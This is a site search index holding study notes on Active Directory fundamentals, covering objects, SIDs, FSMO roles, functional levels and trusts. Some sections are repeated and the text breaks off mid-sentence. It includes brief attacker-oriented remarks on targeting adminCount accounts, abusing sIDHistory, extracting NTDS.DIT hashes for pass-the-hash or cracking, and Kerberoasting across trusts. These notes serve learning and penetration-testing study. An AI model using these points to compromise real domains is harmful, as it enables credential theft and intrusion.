{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"","title":"Home"},{"location":"active_directory/ad_fundamentals/","text":"Active Directory Structure \u00b6 Active Directory (AD) is a directory service for Windows network environments. It is a distributed, hierarchical structure that allows for centralized management of an organization's resources, including users, computers, groups, network devices and file shares, group policies, servers and workstations, and trusts. AD provides authentication and authorization functions within a Windows domain environment. A directory service, such as Active Directory Domain Services (AD DS) gives an organization ways to store directory data and make it available to both standard users and administrators on the same network. AD DS stores information such as usernames and passwords and manages the rights needed for authorized users to access this information. A basic AD user account with no added privileges can be used to enumerate the majority of objects contained within AD, including but not limited to: Domain Computers Domain Users Domain Group Information Organizational Units (OUs) Default Domain Policy Functional Domain Levels Password Policy Group Policy Objects (GPOs) Domain Trusts Access Control Lists (ACLs) Active Directory Terminology \u00b6 Object An object can be defined as ANY resource present within an Active Directory environment such as OUs, printers, users, domain controllers, etc. Attributes Every object in Active Directory has an associated set of attributes used to define characteristics of the given object. A computer object contains attributes such as the hostname and DNS name. All attributes in AD have an associated LDAP name that can be used when performing LDAP queries, such as displayName for Full Name and given name for First Name. Schema The Active Directory schema is essentially the blueprint of any enterprise environment. It defines what types of objects can exist in the AD database and their associated attributes. It lists definitions corresponding to AD objects and holds information about each object. For example, users in AD belong to the class \"user,\" and computer objects to \"computer,\" and so on. Each object has its own information (some required to be set and others optional) that are stored in Attributes. When an object is created from a class, this is called instantiation, and an object created from a specific class is called an instance of that class. For example, if we take the computer RDS01. This computer object is an instance of the \"computer\" class in Active Directory. Domain A domain is a logical group of objects such as computers, users, OUs, groups, etc. We can think of each domain as a different city within a state or country. Domains can operate entirely independently of one another or be connected via trust relationships. Forest A forest is a collection of Active Directory domains. It is the topmost container and contains all of the AD objects introduced below, including but not limited to domains, users, groups, computers, and Group Policy objects. A forest can contain one or multiple domains and be thought of as a state in the US or a country within the EU. Each forest operates independently but may have various trust relationships with other forests. Tree A tree is a collection of Active Directory domains that begins at a single root domain. A forest is a collection of AD trees. Each domain in a tree shares a boundary with the other domains. A parent-child trust relationship is formed when a domain is added under another domain in a tree. Two trees in the same forest cannot share a name (namespace). Let's say we have two trees in an AD forest: inlanefreight.local and ilfreight.local. A child domain of the first would be corp.inlanefreight.local while a child domain of the second could be corp.ilfreight.local. All domains in a tree share a standard Global Catalog which contains all information about objects that belong to the tree. Container Container objects hold other objects and have a defined place in the directory subtree hierarchy. Leaf Leaf objects do not contain other objects and are found at the end of the subtree hierarchy. Global Unique Identifier (GUID) A GUID is a unique 128-bit value assigned when a domain user or group is created. This GUID value is unique across the enterprise, similar to a MAC address. Every single object created by Active Directory is assigned a GUID, not only user and group objects. The GUID is stored in the ObjectGUID attribute. When querying for an AD object (such as a user, group, computer, domain, domain controller, etc.), we can query for its objectGUID value using PowerShell or search for it by specifying its distinguished name, GUID, SID, or SAM account name. GUIDs are used by AD to identify objects internally. Searching in Active Directory by GUID value is probably the most accurate and reliable way to find the exact object you are looking for, especially if the global catalog may contain similar matches for an object name. Specifying the ObjectGUID value when performing AD enumeration will ensure that we get the most accurate results pertaining to the object we are searching for information about. The ObjectGUID property never changes and is associated with the object for as long as that object exists in the domain. Security principals Security principals are anything that the operating system can authenticate, including users, computer accounts, or even threads/processes that run in the context of a user or computer account (i.e., an application such as Tomcat running in the context of a service account within the domain). In AD, security principles are domain objects that can manage access to other resources within the domain. We can also have local user accounts and security groups used to control access to resources on only that specific computer. These are not managed by AD but rather by the Security Accounts Manager (SAM). Security Identifier (SID) A security identifier, or SID is used as a unique identifier for a security principal or security group. Every account, group, or process has its own unique SID, which, in an AD environment, is issued by the domain controller and stored in a secure database. A SID can only be used once. Even if the security principle is deleted, it can never be used again in that environment to identify another user or group. When a user logs in, the system creates an access token for them which contains the user's SID, the rights they have been granted, and the SIDs for any groups that the user is a member of. This token is used to check rights whenever the user performs an action on the computer. There are also well-known SIDs that are used to identify generic users and groups. These are the same across all operating systems. An example is the Everyone group. Distinguished Name (DN) A Distinguished Name (DN) describes the full path to an object in AD (such as cn=bjones, ou=IT, ou=Employees, dc=inlanefreight, dc=local). In this example, the user bjones works in the IT department of the company Inlanefreight, and his account is created in an Organizational Unit (OU) that holds accounts for company employees. The Common Name (CN) bjones is just one way the user object could be searched for or accessed within the domain. Relative Distinguished Name (RDN) A Relative Distinguished Name (RDN) is a single component of the Distinguished Name that identifies the object as unique from other objects at the current level in the naming hierarchy. In our example, bjones is the Relative Distinguished Name of the object. AD does not allow two objects with the same name under the same parent container, but there can be two objects with the same RDNs that are still unique in the domain because they have different DNs. For example, the object cn=bjones,dc=dev,dc=inlanefreight,dc=local would be recognized as different from cn=bjones,dc=inlanefreight,dc=local. sAMAccountName The sAMAccountName is the user's logon name. It must be a unique value and 20 or fewer characters. userPrincipalName The userPrincipalName attribute is another way to identify users in AD. This attribute consists of a prefix (the user account name) and a suffix (the domain name) in the format of bjones@inlanefreight.local. This attribute is not mandatory. FSMO Roles In the early days of AD, if you had multiple DCs in an environment, they would fight over which DC gets to make changes, and sometimes changes would not be made properly. Microsoft then implemented \"last writer wins,\" which could introduce its own problems if the last change breaks things. They then introduced a model in which a single \"master\" DC could apply changes to the domain while the others merely fulfilled authentication requests. This was a flawed design because if the master DC went down, no changes could be made to the environment until it was restored. To resolve this single point of failure model, Microsoft separated the various responsibilities that a DC can have into Flexible Single Master Operation (FSMO) roles. These give Domain Controllers (DC) the ability to continue authenticating users and granting permissions without interruption (authorization and authentication). There are five FMSO roles: Schema Master and Domain Naming Master (one of each per forest), Relative ID (RID) Master (one per domain), Primary Domain Controller (PDC) Emulator (one per domain), and Infrastructure Master (one per domain). All five roles are assigned to the first DC in the forest root domain in a new AD forest. Each time a new domain is added to a forest, only the RID Master, PDC Emulator, and Infrastructure Master roles are assigned to the new domain. FSMO roles are typically set when domain controllers are created, but sysadmins can transfer these roles if needed. These roles help replication in AD to run smoothly and ensure that critical services are operating correctly. Global Catalog A global catalog (GC) is a domain controller that stores copies of ALL objects in an Active Directory forest. The GC stores a full copy of all objects in the current domain and a partial copy of objects that belong to other domains in the forest. Standard domain controllers hold a complete replica of objects belonging to its domain but not those of different domains in the forest. The GC allows both users and applications to find information about any objects in ANY domain in the forest. GC is a feature that is enabled on a domain controller and performs the following functions: Authentication (provided authorization for all groups that a user account belongs to, which is included when an access token is generated) Object search (making the directory structure within a forest transparent, allowing a search to be carried out across all domains in a forest by providing just one attribute about an object.) Read-Only Domain Controller (RODC) A Read-Only Domain Controller (RODC) has a read-only Active Directory database. No AD account passwords are cached on an RODC (other than the RODC computer account & RODC KRBTGT passwords. No changes are pushed out via an RODC's AD database, SYSVOL, or DNS. RODCs also include a read-only DNS server, allow for administrator role separation, reduce replication traffic in the environment, and prevent SYSVOL modifications from being replicated to other DCs. Replication Replication happens in AD when AD objects are updated and transferred from one Domain Controller to another. Whenever a DC is added, connection objects are created to manage replication between them. These connections are made by the Knowledge Consistency Checker (KCC) service, which is present on all DCs. Replication ensures that changes are synchronized with all other DCs in a forest, helping to create a backup in case one domain controller fails. Service Principal Name (SPN) A Service Principal Name (SPN) uniquely identifies a service instance. They are used by Kerberos authentication to associate an instance of a service with a logon account, allowing a client application to request the service to authenticate an account without needing to know the account name. Group Policy Object (GPO) Group Policy Objects (GPOs) are virtual collections of policy settings. Each GPO has a unique GUID. A GPO can contain local file system settings or Active Directory settings. GPO settings can be applied to both user and computer objects. They can be applied to all users and computers within the domain or defined more granularly at the OU level. Access Control List (ACL) An Access Control List (ACL) is the ordered collection of Access Control Entities (ACEs) that apply to an object. Access Control Entities (ACEs) Each Access Control Entity (ACE) in an ACL identifies a trustee (user account, group account, or logon session) and lists the access rights that are allowed, denied, or audited for the given trustee. Discretionary Access Control List (DACL) DACLs define which security principles are granted or denied access to an object; it contains a list of ACEs. When a process tries to access a securable object, the system checks the ACEs in the object's DACL to determine whether or not to grant access. If an object does NOT have a DACL, then the system will grant full access to everyone, but if the DACL has no ACE entries, the system will deny all access attempts. ACEs in the DACL are checked in sequence until a match is found that allows the requested rights or until access is denied. System Access Control Lists (SACL) Allows for administrators to log access attempts that are made to secured objects. ACEs specify the types of access attempts that cause the system to generate a record in the security event log. Fully Qualified Domain Name (FQDN) An FQDN is the complete name for a specific computer or host. It is written with the hostname and domain name in the format [host name].[domain name].[tld]. This is used to specify an object's location in the tree hierarchy of DNS. The FQDN can be used to locate hosts in an Active Directory without knowing the IP address, much like when browsing to a website such as google.com instead of typing in the associated IP address. An example would be the host DC01 in the domain INLANEFREIGHT.LOCAL. The FQDN here would be DC01.INLANEFREIGHT.LOCAL. Tombstone A tombstone is a container object in AD that holds deleted AD objects. When an object is deleted from AD, the object remains for a set period of time known as the Tombstone Lifetime, and the isDeleted attribute is set to TRUE. Once an object exceeds the Tombstone Lifetime, it will be entirely removed. Microsoft recommends a tombstone lifetime of 180 days to increase the usefulness of backups, but this value may differ across environments. Depending on the DC operating system version, this value will default to 60 or 180 days. If an object is deleted in a domain that does not have an AD Recycle Bin, it will become a tombstone object. When this happens, the object is stripped of most of its attributes and placed in the Deleted Objects container for the duration of the tombstoneLifetime. It can be recovered, but any attributes that were lost can no longer be recovered. AD Recycle Bin The AD Recycle Bin was first introduced in Windows Server 2008 R2 to facilitate the recovery of deleted AD objects. This made it easier for sysadmins to restore objects, avoiding the need to restore from backups, restarting Active Directory Domain Services (AD DS), or rebooting a Domain Controller. When the AD Recycle Bin is enabled, any deleted objects are preserved for a period of time, facilitating restoration if needed. Sysadmins can set how long an object remains in a deleted, recoverable state. If this is not specified, the object will be restorable for a default value of 60 days. The biggest advantage of using the AD Recycle Bin is that most of a deleted object's attributes are preserved, which makes it far easier to fully restore a deleted object to its previous state. SYSVOL The SYSVOL folder, or share, stores copies of public files in the domain such as system policies, Group Policy settings, logon/logoff scripts, and often contains other types of scripts that are executed to perform various tasks in the AD environment. The contents of the SYSVOL folder are replicated to all DCs within the environment using File Replication Services (FRS). You can read more about the SYSVOL structure here. AdminSDHolder The AdminSDHolder object is used to manage ACLs for members of built-in groups in AD marked as privileged. It acts as a container that holds the Security Descriptor applied to members of protected groups. The SDProp (SD Propagator) process runs on a schedule on the PDC Emulator Domain Controller. When this process runs, it checks members of protected groups to ensure that the correct ACL is applied to them. It runs every hour by default. For example, suppose an attacker is able to create a malicious ACL entry to grant a user certain rights over a member of the Domain Admins group. In that case, unless they modify other settings in AD, these rights will be removed (and they will lose any persistence they were hoping to achieve) when the SDProp process runs on the set interval. dsHeuristics The dsHuerisitcs attribute is a string value set on the Directory Service object used to define multiple forest-wide configuration settings. One of these settings is to exclude built-in groups from the Protected Groups list. Groups in this list are protected from modification via the AdminSDHolder object. If a group is excluded via the dsHuerisitcs attribute, then any changes that affect it will not be reverted when the SDProp process runs. adminCount The adminCount attribute determines whether or not the SDProp process protects a user. If the value is set to 0 or not specified, the user is not protected. If the attribute value is set to value, the user is protected. Attackers will often look for accounts with the adminCount attribute set to 1 to target in an internal environment. These are often privileged accounts and may lead to further access or full domain compromise. Active Directory Users and Computers (ADUC) ADUC is a GUI console commonly used for managing users, groups, computers, and contacts in AD. Changes made in ADUC can be done via PowerShell as well. ADSI Edit ADSI Edit is a GUI tool used to manage objects in AD. It provides access to far more than is available in ADUC and can be used to set or delete any attribute available on an object, add, remove, and move objects as well. It is a powerful tool that allows a user to access AD at a much deeper level. Great care should be taken when using this tool, as changes here could cause major problems in AD. sIDHistory This attribute holds any SIDs that an object was assigned previously. It is usually used in migrations so a user can maintain the same level of access when migrated from one domain to another. This attribute can potentially be abused if set insecurely, allowing an attacker to gain prior elevated access that an account had before a migration if SID Filtering (or removing SIDs from another domain from a user's access token that could be used for elevated access) is not enabled. NTDS.DIT The NTDS.DIT file can be considered the heart of Active Directory. It is stored on a Domain Controller at C:\\Windows\\NTDS and is a database that stores AD data such as information about user and group objects, group membership, and, most important to attackers and penetration testers, the password hashes for all users in the domain. Once full domain compromise is reached, an attacker can retrieve this file, extract the hashes, and either use them to perform a pass-the-hash attack or crack them offline using a tool such as Hashcat to access additional resources in the domain. If the setting Store password with reversible encryption is enabled, then the NTDS.DIT will also store the cleartext passwords for all users created or who changed their password after this policy was set. While rare, some organizations may enable this setting if they use applications or protocols that need to use a user's existing password (and not Kerberos) for authentication. Active Directory Objects \u00b6 Users These are the users within the organization's AD environment. Users are considered leaf objects , which means that they cannot contain any other objects within them. Another example of a leaf object is a mailbox in Microsoft Exchange. A user object is considered a security principal and has a security identifier (SID) and a global unique identifier (GUID). User objects have many possible attributes, such as their display name, last login time, date of last password change, email address, account description, manager, address, and more. They are a crucial target for attackers since gaining access to even a low privileged user can grant access to many objects and resources and allow for detailed enumeration of the entire domain (or forest). Contacts A contact object is usually used to represent an external user and contains informational attributes such as first name, last name, email address, telephone number, etc. They are leaf objects and are NOT security principals (securable objects), so they don't have a SID, only a GUID. An example would be a contact card for a third-party vendor or a customer. Printers A printer object points to a printer accessible within the AD network. Like a contact, a printer is a leaf object and not a security principal, so it only has a GUID. Printers have attributes such as the printer's name, driver information, port number, etc. Computers A computer object is any computer joined to the AD network (workstation or server). Computers are leaf objects because they do not contain other objects. However, they are considered security principals and have a SID and a GUID. Like users, they are prime targets for attackers since full administrative access to a computer (as the all-powerful NT AUTHORITY\\SYSTEM account) grants similar rights to a standard domain user and can be used to perform the majority of the enumeration tasks that a user account can (save for a few exceptions across domain trusts.) Shared Folders A shared folder object points to a shared folder on the specific computer where the folder resides. Shared folders can have stringent access control applied to them and can be either accessible to everyone (even those without a valid AD account), open to only authenticated users (which means anyone with even the lowest privileged user account OR a computer account ( NT AUTHORITY\\SYSTEM ) could access it), or be locked down to only allow certain users/groups access. Anyone not explicitly allowed access will be denied from listing or reading its contents. Shared folders are NOT security principles and only have a GUID. A shared folder's attributes can include the name, location on the system, security access rights. Groups A group is considered a container object because it can contain other objects, including users, computers, and even other groups. A group IS regarded as a security principal and has a SID and a GUID. In AD, groups are a way to manage user permissions and access to other securable objects (both users and computers). Let's say we want to give 20 help desk users access to the Remote Management Users group on a jump host. Instead of adding the users one by one, we could add the group, and the users would inherit the intended permissions via their membership in the group. In Active Directory, we commonly see what are called \"nested groups\" (a group added as a member of another group), which can lead to a user(s) obtaining unintended rights. Nested group membership is something we see and often leverage during penetration tests. The tool BloodHound helps to discover attack paths within a network and illustrate them in a graphical interface. It is excellent for auditing group membership and uncovering/seeing the sometimes unintended impacts of nested group membership. Groups in AD can have many attributes, the most common being the name, description, membership, and other groups that the group belongs to. Many other attributes can be set, which we will discuss more in-depth later in this module. Organizational Units (OUs) An organizational unit, or OU from here on out, is a container that systems administrators can use to store similar objects for ease of administration. OUs are often used for administrative delegation of tasks without granting a user account full administrative rights. For example, we may have a top-level OU called Employees and then child OUs under it for the various departments such as Marketing, HR, Finance, Help Desk, etc. If an account were given the right to reset passwords over the top-level OU, this user would have the right to reset passwords for all users in the company. However, if the OU structure were such that specific departments were child OUs of the Help Desk OU, then any user placed in the Help Desk OU would have this right delegated to them if granted. Other tasks that may be delegated at the OU level include creating/deleting users, modifying group membership, managing Group Policy links, and performing password resets. OUs are very useful for managing Group Policy (which we will study later in this module) settings across a subset of users and groups within a domain. For example, we may want to set a specific password policy for privileged service accounts so these accounts could be placed in a particular OU and then have a Group Policy object assigned to it, which would enforce this password policy on all accounts placed inside of it. A few OU attributes include its name, members, security settings, and more. Domain A domain is the structure of an AD network. Domains contain objects such as users and computers, which are organized into container objects: groups and OUs. Every domain has its own separate database and sets of policies that can be applied to any and all objects within the domain. Some policies are set by default (and can be tweaked), such as the domain password policy. In contrast, others are created and applied based on the organization's need, such as blocking access to cmd.exe for all non-administrative users or mapping shared drives at log in. Domain Controllers Domain Controllers are essentially the brains of an AD network. They handle authentication requests, verify users on the network, and control who can access the various resources in the domain. All access requests are validated via the domain controller and privileged access requests are based on predetermined roles assigned to users. It also enforces security policies and stores information about every other object in the domain. Sites A site in AD is a set of computers across one or more subnets connected using high-speed links. They are used to make replication across domain controllers run efficiently. Built-in In AD, built-in is a container that holds default groups in an AD domain. They are predefined when an AD domain is created. Foreign Security Principals A foreign security principal (FSP) is an object created in AD to represent a security principal that belongs to a trusted external forest. They are created when an object such as a user, group, or computer from an external (outside of the current) forest is added to a group in the current domain. They are created automatically after adding a security principal to a group. Every foreign security principal is a placeholder object that holds the SID of the foreign object (an object that belongs to another forest.) Windows uses this SID to resolve the object's name via the trust relationship. FSPs are created in a specific container named ForeignSecurityPrincipals with a distinguished name like cn=ForeignSecurityPrincipals,dc=inlanefreight,dc=local . Active Directory Functionality \u00b6 There are five Flexible Single Master Operation (FSMO) roles. These roles can be defined as follows: Roles Description Schema Master This role manages the read/write copy of the AD schema, which defines all attributes that can apply to an object in AD. Domain Naming Master Manages domain names and ensures that two domains of the same name are not created in the same forest. Relative ID (RID) Master The RID Master assigns blocks of RIDs to other DCs within the domain that can be used for new objects. The RID Master helps ensure that multiple objects are not assigned the same SID. Domain object SIDs are the domain SID combined with the RID number assigned to the object to make the unique SID. PDC Emulator The host with this role would be the authoritative DC in the domain and respond to authentication requests, password changes, and manage Group Policy Objects (GPOs). The PDC Emulator also maintains time within the domain. Infrastructure Master This role translates GUIDs, SIDs, and DNs between domains. This role is used in organizations with multiple domains in a single forest. The Infrastructure Master helps them to communicate. If this role is not functioning properly, Access Control Lists (ACLs) will show SIDs instead of fully resolved names. Depending on the organization, these roles may be assigned to specific DCs or as defaults each time a new DC is added. Issues with FSMO roles will lead to authentication and authorization difficulties within a domain. Domain and Forest Functional Levels \u00b6 Microsoft introduced functional levels to determine the various features and capabilities available in Active Directory Domain Services (AD DS) at the domain and forest level. They are also used to specify which Windows Server operating systems can run a Domain Controller in a domain or forest. Domain Functional Level Features Available Supported Domain Controller Operating Systems Windows 2000 native Universal groups for distribution and security groups, group nesting, group conversion (between security and distribution and security groups), SID history. Windows Server 2008 R2, Windows Server 2008, Windows Server 2003, Windows 2000 Windows Server 2003 Netdom.exe domain management tool, lastLogonTimestamp attribute introduced, well-known users and computers containers, constrained delegation, selective authentication. Windows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2, Windows Server 2008, Windows Server 2003 Windows Server 2008 Distributed File System (DFS) replication support, Advanced Encryption Standard (AES 128 and AES 256) support for the Kerberos protocol, Fine-grained password policies Windows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2, Windows Server 2008 Windows Server 2008 R2 Authentication mechanism assurance, Managed Service Accounts Windows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2 Windows Server 2012 KDC support for claims, compound authentication, and Kerberos armoring Windows Server 2012 R2, Windows Server 2012 Windows Server 2012 R2 Extra protections for members of the Protected Users group, Authentication Policies, Authentication Policy Silos Windows Server 2012 R2 Windows Server 2016 Smart card required for interactive logon new Kerberos features and new credential protection features Windows Server 2019 and Windows Server 2016 A new functional level was not added with the release of Windows Server 2019. However, Windows Server 2008 functional level is the minimum requirement for adding Server 2019 Domain Controllers to an environment. Also, the target domain has to use DFS-R for SYSVOL replication. Forest functional levels have introduced a few key capabilities over the years: Version Capabilities Windows Server 2003 saw the introduction of the forest trust, domain renaming, read-only domain controllers (RODC), and more. Windows Server 2008 All new domains added to the forest default to the Server 2008 domain functional level. No additional new features. Windows Server 2008 R2 Active Directory Recycle Bin provides the ability to restore deleted objects when AD DS is running. Windows Server 2012 All new domains added to the forest default to the Server 2012 domain functional level. No additional new features. Windows Server 2012 R2 All new domains added to the forest default to the Server 2012 R2 domain functional level. No additional new features. Windows Server 2016 Privileged access management (PAM) using Microsoft Identity Manager (MIM). Trusts \u00b6 A trust is used to establish forest-forest or domain-domain authentication, allowing users to access resources in (or administer) another domain outside of the domain their account resides in. A trust creates a link between the authentication systems of two domains. Trust Type Description Parent-child Domains within the same forest. The child domain has a two-way transitive trust with the parent domain. Cross-link a trust between child domains to speed up authentication. External A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering. Tree-root a two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest. Forest a transitive trust between two forest root domains. Trusts can be transitive or non-transitive. A transitive trust means that trust is extended to objects that the child domain trusts. In a non-transitive trust, only the child domain itself is trusted. Trusts can be set up to be one-way or two-way (bidirectional). In bidirectional trusts, users from both trusting domains can access resources. In a one-way trust, only users in a trusted domain can access resources in a trusting domain, not vice-versa. The direction of trust is opposite to the direction of access. Often, domain trusts are set up improperly and provide unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications. Mergers and acquisitions can result in bidirectional trusts with acquired companies, unknowingly introducing risk into the acquiring company\u2019s environment. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain.","title":"Fundamentals"},{"location":"active_directory/ad_fundamentals/#active-directory-structure","text":"Active Directory (AD) is a directory service for Windows network environments. It is a distributed, hierarchical structure that allows for centralized management of an organization's resources, including users, computers, groups, network devices and file shares, group policies, servers and workstations, and trusts. AD provides authentication and authorization functions within a Windows domain environment. A directory service, such as Active Directory Domain Services (AD DS) gives an organization ways to store directory data and make it available to both standard users and administrators on the same network. AD DS stores information such as usernames and passwords and manages the rights needed for authorized users to access this information. A basic AD user account with no added privileges can be used to enumerate the majority of objects contained within AD, including but not limited to: Domain Computers Domain Users Domain Group Information Organizational Units (OUs) Default Domain Policy Functional Domain Levels Password Policy Group Policy Objects (GPOs) Domain Trusts Access Control Lists (ACLs)","title":"Active Directory Structure"},{"location":"active_directory/ad_fundamentals/#active-directory-terminology","text":"Object An object can be defined as ANY resource present within an Active Directory environment such as OUs, printers, users, domain controllers, etc. Attributes Every object in Active Directory has an associated set of attributes used to define characteristics of the given object. A computer object contains attributes such as the hostname and DNS name. All attributes in AD have an associated LDAP name that can be used when performing LDAP queries, such as displayName for Full Name and given name for First Name. Schema The Active Directory schema is essentially the blueprint of any enterprise environment. It defines what types of objects can exist in the AD database and their associated attributes. It lists definitions corresponding to AD objects and holds information about each object. For example, users in AD belong to the class \"user,\" and computer objects to \"computer,\" and so on. Each object has its own information (some required to be set and others optional) that are stored in Attributes. When an object is created from a class, this is called instantiation, and an object created from a specific class is called an instance of that class. For example, if we take the computer RDS01. This computer object is an instance of the \"computer\" class in Active Directory. Domain A domain is a logical group of objects such as computers, users, OUs, groups, etc. We can think of each domain as a different city within a state or country. Domains can operate entirely independently of one another or be connected via trust relationships. Forest A forest is a collection of Active Directory domains. It is the topmost container and contains all of the AD objects introduced below, including but not limited to domains, users, groups, computers, and Group Policy objects. A forest can contain one or multiple domains and be thought of as a state in the US or a country within the EU. Each forest operates independently but may have various trust relationships with other forests. Tree A tree is a collection of Active Directory domains that begins at a single root domain. A forest is a collection of AD trees. Each domain in a tree shares a boundary with the other domains. A parent-child trust relationship is formed when a domain is added under another domain in a tree. Two trees in the same forest cannot share a name (namespace). Let's say we have two trees in an AD forest: inlanefreight.local and ilfreight.local. A child domain of the first would be corp.inlanefreight.local while a child domain of the second could be corp.ilfreight.local. All domains in a tree share a standard Global Catalog which contains all information about objects that belong to the tree. Container Container objects hold other objects and have a defined place in the directory subtree hierarchy. Leaf Leaf objects do not contain other objects and are found at the end of the subtree hierarchy. Global Unique Identifier (GUID) A GUID is a unique 128-bit value assigned when a domain user or group is created. This GUID value is unique across the enterprise, similar to a MAC address. Every single object created by Active Directory is assigned a GUID, not only user and group objects. The GUID is stored in the ObjectGUID attribute. When querying for an AD object (such as a user, group, computer, domain, domain controller, etc.), we can query for its objectGUID value using PowerShell or search for it by specifying its distinguished name, GUID, SID, or SAM account name. GUIDs are used by AD to identify objects internally. Searching in Active Directory by GUID value is probably the most accurate and reliable way to find the exact object you are looking for, especially if the global catalog may contain similar matches for an object name. Specifying the ObjectGUID value when performing AD enumeration will ensure that we get the most accurate results pertaining to the object we are searching for information about. The ObjectGUID property never changes and is associated with the object for as long as that object exists in the domain. Security principals Security principals are anything that the operating system can authenticate, including users, computer accounts, or even threads/processes that run in the context of a user or computer account (i.e., an application such as Tomcat running in the context of a service account within the domain). In AD, security principles are domain objects that can manage access to other resources within the domain. We can also have local user accounts and security groups used to control access to resources on only that specific computer. These are not managed by AD but rather by the Security Accounts Manager (SAM). Security Identifier (SID) A security identifier, or SID is used as a unique identifier for a security principal or security group. Every account, group, or process has its own unique SID, which, in an AD environment, is issued by the domain controller and stored in a secure database. A SID can only be used once. Even if the security principle is deleted, it can never be used again in that environment to identify another user or group. When a user logs in, the system creates an access token for them which contains the user's SID, the rights they have been granted, and the SIDs for any groups that the user is a member of. This token is used to check rights whenever the user performs an action on the computer. There are also well-known SIDs that are used to identify generic users and groups. These are the same across all operating systems. An example is the Everyone group. Distinguished Name (DN) A Distinguished Name (DN) describes the full path to an object in AD (such as cn=bjones, ou=IT, ou=Employees, dc=inlanefreight, dc=local). In this example, the user bjones works in the IT department of the company Inlanefreight, and his account is created in an Organizational Unit (OU) that holds accounts for company employees. The Common Name (CN) bjones is just one way the user object could be searched for or accessed within the domain. Relative Distinguished Name (RDN) A Relative Distinguished Name (RDN) is a single component of the Distinguished Name that identifies the object as unique from other objects at the current level in the naming hierarchy. In our example, bjones is the Relative Distinguished Name of the object. AD does not allow two objects with the same name under the same parent container, but there can be two objects with the same RDNs that are still unique in the domain because they have different DNs. For example, the object cn=bjones,dc=dev,dc=inlanefreight,dc=local would be recognized as different from cn=bjones,dc=inlanefreight,dc=local. sAMAccountName The sAMAccountName is the user's logon name. It must be a unique value and 20 or fewer characters. userPrincipalName The userPrincipalName attribute is another way to identify users in AD. This attribute consists of a prefix (the user account name) and a suffix (the domain name) in the format of bjones@inlanefreight.local. This attribute is not mandatory. FSMO Roles In the early days of AD, if you had multiple DCs in an environment, they would fight over which DC gets to make changes, and sometimes changes would not be made properly. Microsoft then implemented \"last writer wins,\" which could introduce its own problems if the last change breaks things. They then introduced a model in which a single \"master\" DC could apply changes to the domain while the others merely fulfilled authentication requests. This was a flawed design because if the master DC went down, no changes could be made to the environment until it was restored. To resolve this single point of failure model, Microsoft separated the various responsibilities that a DC can have into Flexible Single Master Operation (FSMO) roles. These give Domain Controllers (DC) the ability to continue authenticating users and granting permissions without interruption (authorization and authentication). There are five FMSO roles: Schema Master and Domain Naming Master (one of each per forest), Relative ID (RID) Master (one per domain), Primary Domain Controller (PDC) Emulator (one per domain), and Infrastructure Master (one per domain). All five roles are assigned to the first DC in the forest root domain in a new AD forest. Each time a new domain is added to a forest, only the RID Master, PDC Emulator, and Infrastructure Master roles are assigned to the new domain. FSMO roles are typically set when domain controllers are created, but sysadmins can transfer these roles if needed. These roles help replication in AD to run smoothly and ensure that critical services are operating correctly. Global Catalog A global catalog (GC) is a domain controller that stores copies of ALL objects in an Active Directory forest. The GC stores a full copy of all objects in the current domain and a partial copy of objects that belong to other domains in the forest. Standard domain controllers hold a complete replica of objects belonging to its domain but not those of different domains in the forest. The GC allows both users and applications to find information about any objects in ANY domain in the forest. GC is a feature that is enabled on a domain controller and performs the following functions: Authentication (provided authorization for all groups that a user account belongs to, which is included when an access token is generated) Object search (making the directory structure within a forest transparent, allowing a search to be carried out across all domains in a forest by providing just one attribute about an object.) Read-Only Domain Controller (RODC) A Read-Only Domain Controller (RODC) has a read-only Active Directory database. No AD account passwords are cached on an RODC (other than the RODC computer account & RODC KRBTGT passwords. No changes are pushed out via an RODC's AD database, SYSVOL, or DNS. RODCs also include a read-only DNS server, allow for administrator role separation, reduce replication traffic in the environment, and prevent SYSVOL modifications from being replicated to other DCs. Replication Replication happens in AD when AD objects are updated and transferred from one Domain Controller to another. Whenever a DC is added, connection objects are created to manage replication between them. These connections are made by the Knowledge Consistency Checker (KCC) service, which is present on all DCs. Replication ensures that changes are synchronized with all other DCs in a forest, helping to create a backup in case one domain controller fails. Service Principal Name (SPN) A Service Principal Name (SPN) uniquely identifies a service instance. They are used by Kerberos authentication to associate an instance of a service with a logon account, allowing a client application to request the service to authenticate an account without needing to know the account name. Group Policy Object (GPO) Group Policy Objects (GPOs) are virtual collections of policy settings. Each GPO has a unique GUID. A GPO can contain local file system settings or Active Directory settings. GPO settings can be applied to both user and computer objects. They can be applied to all users and computers within the domain or defined more granularly at the OU level. Access Control List (ACL) An Access Control List (ACL) is the ordered collection of Access Control Entities (ACEs) that apply to an object. Access Control Entities (ACEs) Each Access Control Entity (ACE) in an ACL identifies a trustee (user account, group account, or logon session) and lists the access rights that are allowed, denied, or audited for the given trustee. Discretionary Access Control List (DACL) DACLs define which security principles are granted or denied access to an object; it contains a list of ACEs. When a process tries to access a securable object, the system checks the ACEs in the object's DACL to determine whether or not to grant access. If an object does NOT have a DACL, then the system will grant full access to everyone, but if the DACL has no ACE entries, the system will deny all access attempts. ACEs in the DACL are checked in sequence until a match is found that allows the requested rights or until access is denied. System Access Control Lists (SACL) Allows for administrators to log access attempts that are made to secured objects. ACEs specify the types of access attempts that cause the system to generate a record in the security event log. Fully Qualified Domain Name (FQDN) An FQDN is the complete name for a specific computer or host. It is written with the hostname and domain name in the format [host name].[domain name].[tld]. This is used to specify an object's location in the tree hierarchy of DNS. The FQDN can be used to locate hosts in an Active Directory without knowing the IP address, much like when browsing to a website such as google.com instead of typing in the associated IP address. An example would be the host DC01 in the domain INLANEFREIGHT.LOCAL. The FQDN here would be DC01.INLANEFREIGHT.LOCAL. Tombstone A tombstone is a container object in AD that holds deleted AD objects. When an object is deleted from AD, the object remains for a set period of time known as the Tombstone Lifetime, and the isDeleted attribute is set to TRUE. Once an object exceeds the Tombstone Lifetime, it will be entirely removed. Microsoft recommends a tombstone lifetime of 180 days to increase the usefulness of backups, but this value may differ across environments. Depending on the DC operating system version, this value will default to 60 or 180 days. If an object is deleted in a domain that does not have an AD Recycle Bin, it will become a tombstone object. When this happens, 